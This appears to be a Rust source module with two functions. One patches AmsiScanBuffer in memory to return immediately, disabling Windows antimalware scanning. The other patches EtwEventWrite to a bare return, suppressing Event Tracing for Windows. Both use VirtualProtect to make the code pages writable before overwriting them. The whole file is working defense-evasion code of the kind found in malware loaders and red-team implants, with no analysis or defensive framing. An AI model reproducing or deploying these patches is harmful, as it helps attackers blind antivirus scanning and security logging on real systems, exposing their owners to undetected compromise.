use std::ffi::c_void;

#[cfg(windows)]
pub unsafe fn patch_amsi() {
    let amsi = winapi::um::libloaderapi::LoadLibraryA(b"amsi.dll\0".as_ptr() as _);
    if amsi.is_null() { return; }
    let AmsiScanBuffer = winapi::um::libloaderapi::GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr() as _);
    if AmsiScanBuffer.is_null() { return; }

    let mut old_protect = 0;
    winapi::um::memoryapi::VirtualProtect(AmsiScanBuffer as *mut _, 3, winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old_protect);
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret
    std::ptr::copy_nonoverlapping(patch.as_ptr(), AmsiScanBuffer as *mut u8, 3);
    winapi::um::memoryapi::VirtualProtect(AmsiScanBuffer as *mut _, 3, old_protect, &mut old_protect);
}

#[cfg(windows)]
pub unsafe fn patch_etw() {
    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
    if ntdll.is_null() { return; }
    let EtwEventWrite = winapi::um::libloaderapi::GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr() as _);
    if EtwEventWrite.is_null() { return; }

    let mut old_protect = 0;
    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 1, winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old_protect);
    let patch: [u8; 1] = [0xC3]; // ret
    std::ptr::copy_nonoverlapping(patch.as_ptr(), EtwEventWrite as *mut u8, 1);
    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 1, old_protect, &mut old_protect);
}

#[cfg(not(windows))]
pub unsafe fn patch_amsi() {}

#[cfg(not(windows))]
pub unsafe fn patch_etw() {}
